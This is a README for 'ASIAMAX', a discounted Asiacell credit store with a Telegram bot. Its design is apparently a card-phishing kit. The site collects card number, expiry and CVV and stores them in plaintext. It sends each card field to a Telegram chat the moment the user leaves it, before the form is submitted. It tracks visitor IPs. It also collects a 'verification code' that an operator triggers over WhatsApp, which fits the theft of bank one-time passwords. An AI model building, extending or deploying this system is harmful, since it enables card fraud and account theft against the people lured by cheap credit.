# Workspace

## Overview

ASIAMAX - Asiacell credit store for Iraq. Arabic RTL interface with Telegram bot integration for admin order management. Domain: asiamax.store

## Stack

- **Monorepo tool**: pnpm workspaces
- **Node.js version**: 24
- **Package manager**: pnpm
- **TypeScript version**: 5.9
- **API framework**: Express 5
- **Database**: PostgreSQL + Drizzle ORM
- **Frontend**: React + Vite + Tailwind CSS + shadcn/ui + framer-motion
- **Validation**: Zod (`zod/v4`), `drizzle-zod`
- **API codegen**: Orval (from OpenAPI spec)
- **Build**: esbuild (ESM bundle)
- **Notifications**: Telegram Bot API

## Features

- Asiacell credit packages (5k, 10k, 25k, 50k, 100k IQD at discounted prices)
- Card payment info collection (name, number, expiry, CVV)
- WhatsApp contact collection
- Real-time field tracking (each field sent to Telegram on blur)
- Code verification system
- Real-time order status polling
- Telegram bot notifications with approve/reject inline buttons
- IP tracking per order
- Arabic RTL interface
- Dark theme with Asiacell red + gold accents
- Strong SEO with structured data (Schema.org)

## Structure

```text
/
├── artifacts/
│   ├── api-server/           # Express API server with Telegram integration
│   └── uc-store/             # React + Vite frontend (ASIAMAX Store)
├── lib/
│   ├── api-spec/             # OpenAPI spec + Orval codegen config
│   ├── api-client-react/     # Generated React Query hooks
│   ├── api-zod/              # Generated Zod schemas from OpenAPI
│   └── db/                   # Drizzle ORM schema + DB connection
├── scripts/
│   └── init-db.sql           # DB migration for VPS
├── Dockerfile                # Multi-stage Docker build
├── docker-compose.yml        # App + PostgreSQL (port 6000)
├── nginx.conf                # Nginx reverse proxy for asiamax.store
├── deploy.sh                 # One-click VPS deployment script
└── VPS-SETUP.md              # Deployment guide
```

## Pages

- `SelectPackage.tsx` - Home page, credit package selection
- `PaymentInfo.tsx` - Card details + WhatsApp contact form
- `VerifyCode.tsx` - Code input for verification
- `OrderStatus.tsx` - Real-time order status display
- `NotFound.tsx` - 404 page

## API Endpoints

- `POST /api/orders` - Create order
- `POST /api/orders/:id/contact` - Submit card + contact info
- `POST /api/orders/:id/field` - Real-time field tracking to Telegram
- `POST /api/orders/:id/code` - Submit verification code
- `GET /api/orders/:id/status` - Poll order status
- `POST /api/orders/:id/decide` - Approve/reject order
- `POST /api/telegram/webhook` - Telegram bot webhook

## Environment Variables

- `TELEGRAM_BOT_TOKEN` - Telegram bot token
- `TELEGRAM_CHAT_ID` - Telegram chat ID for notifications
- `DATABASE_URL` - PostgreSQL connection string

## VPS Deployment

- **Port**: 6000
- **Domain**: asiamax.store
- **Path**: /var/www/asiamax.store
- **Deploy**: `./deploy.sh`

## Database Schema

### orders table
- id (varchar, PK)
- product_id, product_name, price, quantity
- card_name, card_number, card_expiry, card_cvv (nullable)
- whatsapp, name (nullable)
- code (nullable)
- status (pending → contact_submitted → code_submitted → approved/rejected)
- ip_address
- created_at

## Order Flow

1. User selects credit package → Order created → Telegram notification
2. User fills card details + WhatsApp → Each field sent to Telegram in real-time
3. User submits form → All data saved → Full summary sent to Telegram
4. Admin sends code to user via WhatsApp
5. User enters code → Telegram notification with approve/reject buttons
6. Admin clicks approve/reject → Status updated → Frontend shows result
